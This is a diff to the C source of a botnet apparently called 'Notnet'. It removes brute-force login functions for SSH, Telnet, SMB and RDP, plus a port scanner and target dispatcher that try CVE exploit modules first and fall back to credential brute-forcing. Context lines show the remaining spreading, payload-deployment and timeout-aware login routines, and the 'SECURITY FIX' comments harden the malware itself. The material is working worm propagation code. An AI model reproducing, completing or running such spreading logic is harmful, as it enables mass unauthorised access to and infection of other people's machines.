@@ -215,88 +215,6 @@ static int create_connection(const char *ip, uint16_t port, int timeout_ms) {
 }
 
 /* ── SSH Spreading ───────────────────────────────────────────── */
-int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass) {
-    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
-    if (sock < 0) return -1;
-    
-    /* Read banner */
-    char banner[256] = {0};
-    fd_set fds;
-    struct timeval tv;
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 1;
-    tv.tv_usec = 0;
-    
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        recv(sock, banner, sizeof(banner) - 1, 0);
-        banner[sizeof(banner) - 1] = '\0';
-    }
-    
-    /* SECURITY FIX (#33): banner is zero-initialized, so if select()
-     * times out strstr() below sees an empty string, not stack garbage. */
-    /* Check for SSH-2 banner (more secure than SSH-1) */
-    if (strstr(banner, "SSH-2") == NULL) {
-        close(sock);
-        return -1;
-    }
-    
-    /* Send SSH banner */
-    char our_banner[256];
-    snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
-    send(sock, our_banner, strlen(our_banner), 0);
-    
-    /* Read server banner or prompt */
-    char resp[256];
-    memset(resp, 0, sizeof(resp));
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 1;
-    tv.tv_usec = 0;
-    select(sock + 1, &fds, NULL, NULL, &tv);
-    recv(sock, resp, sizeof(resp) - 1, 0);
-    
-    /* Send username */
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
-    send(sock, cmd, strlen(cmd), 0);
-    
-    /* Read password prompt */
-    memset(resp, 0, sizeof(resp));
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 1;
-    tv.tv_usec = 0;
-    select(sock + 1, &fds, NULL, NULL, &tv);
-    recv(sock, resp, sizeof(resp) - 1, 0);
-    
-    /* Send password */
-    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
-    send(sock, cmd, strlen(cmd), 0);
-    
-    /* Read response */
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 2;
-    tv.tv_usec = 0;
-    
-    int success = 0;
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        memset(resp, 0, sizeof(resp));
-        recv(sock, resp, sizeof(resp) - 1, 0);
-        resp[sizeof(resp) - 1] = '\0';
-        /* Check for successful login indicators */
-        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "Welcome")) {
-            success = 1;
-        }
-    }
-    
-    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
-    if (success) return sock;
-    close(sock);
-    return -1;
-}
-
 /* Timeout-aware SSH login — uses provided timeout_ms instead of SCAN_TIMEOUT_MS.
  * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
 int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
@@ -440,69 +358,6 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
 }
 
 /* ── Telnet Spreading ─────────────────────────────────────── */
-int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass) {
-    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
-    if (sock < 0) return -1;
-    
-    /* SECURITY FIX (#33): zero-initialize banner so a select() timeout
-     * leaves an empty string, never stack garbage fed to later strstr(). */
-    char banner[256] = {0};
-    fd_set fds;
-    struct timeval tv;
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 1;
-    tv.tv_usec = 0;
-    
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        recv(sock, banner, sizeof(banner) - 1, 0);
-        banner[sizeof(banner) - 1] = '\0';
-    }
-    
-    /* Send username */
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
-    send(sock, cmd, strlen(cmd), 0);
-    
-    /* Read prompt */
-    char resp[256];
-    memset(resp, 0, sizeof(resp));
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 2;
-    tv.tv_usec = 0;
-    
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        memset(resp, 0, sizeof(resp));
-        recv(sock, resp, sizeof(resp) - 1, 0);
-    }
-    
-    /* Send password */
-    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
-    send(sock, cmd, strlen(cmd), 0);
-    
-    /* Read response */
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 2;
-    tv.tv_usec = 0;
-    
-    int success = 0;
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        memset(resp, 0, sizeof(resp));
-        recv(sock, resp, sizeof(resp) - 1, 0);
-        resp[sizeof(resp) - 1] = '\0';
-        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "OK")) {
-            success = 1;
-        }
-    }
-    
-    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
-    if (success) return sock;
-    close(sock);
-    return -1;
-}
-
 /* Timeout-aware telnet login — uses provided timeout_ms.
  * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
 int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
@@ -1055,28 +910,6 @@ static int smb_deploy_payload(int sock, uint16_t tid, uint16_t uid, uint16_t mid
     }
 
     return ret;
-}
-
-
-int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass) {
-    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
-    if (sock < 0) return -1;
-
-    /* SMB1 negotiation */
-    if (smb1_negotiate(sock) <= 0) {
-        close(sock);
-        return -1;
-    }
-
-    /* Session setup with credentials */
-    uint16_t uid = 0;
-    if (smb1_session_setup(sock, user, pass, &uid) != 0) {
-        close(sock);
-        return -1;
-    }
-
-    log_info("SMB: session established as uid=%d", uid);
-    return sock;
 }
 
 int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
@@ -1815,46 +1648,6 @@ static int rdp_send_share_key(int sock) {
 }
 
 /* ── RDP Authentication ────────────────────────────────── */
-int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass) {
-    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
-    if (sock < 0) return -1;
-
-    /* Full RDP handshake */
-    if (rdp_connect(sock) != 0) {
-        close(sock);
-        return -1;
-    }
-
-    /* Send credentials with key exchange */
-    if (rdp_send_cred_key_exchange(sock, user, pass) <= 0) {
-        close(sock);
-        return -1;
-    }
-
-    /* Read auth response */
-    if (rdp_read_cred_response(sock) <= 0) {
-        close(sock);
-        return -1;
-    }
-
-    /* Final control */
-    if (rdp_send_final_control(sock) <= 0) {
-        close(sock);
-        return -1;
-    }
-
-    if (rdp_read_final_control_response(sock) <= 0) {
-        close(sock);
-        return -1;
-    }
-
-    /* Share key */
-    rdp_send_share_key(sock);
-
-    log_info("RDP: authenticated to %s:%d as %s", ip, port, user);
-    return sock;
-}
-
 int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->rdp_enabled) return -1;
 
@@ -2392,32 +2185,6 @@ int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
     return 0;
 }
 
-int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
-    int timeout = SCAN_TIMEOUT_MS;
-    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
-    if (scan_port_with_timeout(ip, port, timeout) != 0) return -1;
-
-    /* Port is open */
-    bot->scan_count++;
-    log_info("port open: %s:%d", ip, port);
-
-    /* #83: CVE-first — known-CVE modules are the primary vector;
-     * brute-force spreaders run only as fallback. */
-    if (cve_run_modules(bot, ip, port) == 0) return 0;
-
-    /* Brute-force fallback */
-    switch (port) {
-        case 22:  spread_ssh(bot, ip, port); break;
-        case 23:  spread_telnet(bot, ip, port); break;
-        case 445: spread_smb(bot, ip, port); break;
-        case 6379: spread_redis(bot, ip, port); break;
-        case 3389: spread_rdp(bot, ip, port); break;
-    }
-
-    return 0;
-}
-
-
 /* Lightweight port scan that only checks if ports are open (no spreading).
  * Returns a string of "ip:port" for each open port found.
  * Caller must free(). Returns NULL on error. */
@@ -2541,37 +2308,6 @@ char *scan_ports(const char *target, uint16_t *ports, int port_count) {
     }
 
     return result;
-}
-
-/* ── Spread to a specific target ──────────────────────── */
-/* Implements spread_target() declared in spread.h (#73).
- * Dispatches based on target->service (SPREAD_* mask). */
-int spread_target(notnet_bot_t *bot, notnet_target_t *target) {
-    if (!bot || !target) return -1;
-
-    log_info("spread_target: %s:%d service=0x%02x",
-             target->ip, target->port, target->service);
-
-    /* #83: CVE modules first; brute-force spreaders are the fallback. */
-    if (cve_run_modules(bot, target->ip, target->port) == 0) return 0;
-
-    if (target->service & SPREAD_SSH) {
-        if (spread_ssh(bot, target->ip, target->port) == 0) return 0;
-    }
-    if (target->service & SPREAD_TELNET) {
-        if (spread_telnet(bot, target->ip, target->port) == 0) return 0;
-    }
-    if (target->service & SPREAD_SMB) {
-        if (spread_smb(bot, target->ip, target->port) == 0) return 0;
-    }
-    if (target->service & SPREAD_REDIS) {
-        if (spread_redis(bot, target->ip, target->port) == 0) return 0;
-    }
-    if (target->service & SPREAD_RDP) {
-        if (spread_rdp(bot, target->ip, target->port) == 0) return 0;
-    }
-
-    return -1;
 }
 
 /* ── Threaded scanning ────────────────────────────────── */
